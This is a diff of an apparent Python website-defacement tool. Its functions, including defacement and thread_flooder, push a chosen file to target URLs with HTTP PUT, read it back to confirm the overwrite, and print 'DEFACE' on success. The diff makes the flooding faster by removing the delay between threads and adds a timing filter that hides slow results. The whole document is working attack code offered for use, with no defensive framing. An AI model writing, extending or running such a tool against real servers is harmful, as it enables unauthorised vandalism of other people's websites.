@@ -42,15 +42,22 @@ def thread_flooder(threader,t,countdown,booter):
          threading.Thread(target=defacement_flooder,args=(t,countdown,booter)).start()
 
 def defacement(url,files):
+   a = time.time()
    try:
       with open(files,'r') as f:content = f.read()
    except Exception as e:print(f'[❌] {fg(226)}NOT FOUND {fg(255)}--> {fg(227)}{files}{attr(0)}')
    try:
       r = requests.put(url+files,data=content)
       checking = requests.get(url+files)
-      if checking.content.decode() == content:print(f'[✅] {fg(70)}DEFACE {fg(255)}--> {fg(71)}{url}{files} {fg(72)}CODE{fg(255)}={fg(73)}{checking.status_code}:{checking.reason}{attr(0)}')
-      else:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files} {fg(198)}CODE{fg(255)}={fg(199)}{checking.status_code}:{checking.reason}{attr(0)}')
-   except Exception as e:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files} {fg(198)}ERROR{fg(255)}={fg(199)}{e}{attr(0)}')
+      b = time.time()
+      if '0.7495095729827881' < str(b-a):pass
+      else:
+         if checking.content.decode() == content:print(f'[✅] {fg(70)}DEFACE {fg(255)}--> {fg(71)}{url}{files} {fg(72)}CODE{fg(255)}={fg(73)}{checking.status_code}:{checking.reason}{attr(0)}')
+         else:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files} {fg(198)}CODE{fg(255)}={fg(199)}{checking.status_code}:{checking.reason}{attr(0)}')
+   except Exception as e:
+      b = time.time()
+      if '0.7495095729827881' < str(b-a):pass
+      else:print(f'[❌] {fg(196)}FAILED {fg(255)}--> {fg(197)}{url}{files} {fg(198)}ERROR{fg(255)}={fg(199)}{e}{attr(0)}')
 
 def test_defacepage(url,mode,command=''):
    global content_default
@@ -121,6 +128,4 @@ except:
      for a in f.readlines():
       th = threading.Thread(target=reader,args=(a.decode(),mode,command))
       th.start(); th.join()
-      if mode == 0 or mode == 1 or mode == 2:
-         time.sleep(1)
-   except:print(f'[❌] {fg(226)}NOT FOUND {fg(255)}--> {fg(227)}{files_list}{attr(0)}')
+   except:print(f'\n[❌] {fg(226)}NOT FOUND {fg(255)}--> {fg(227)}{files_list}{attr(0)}')
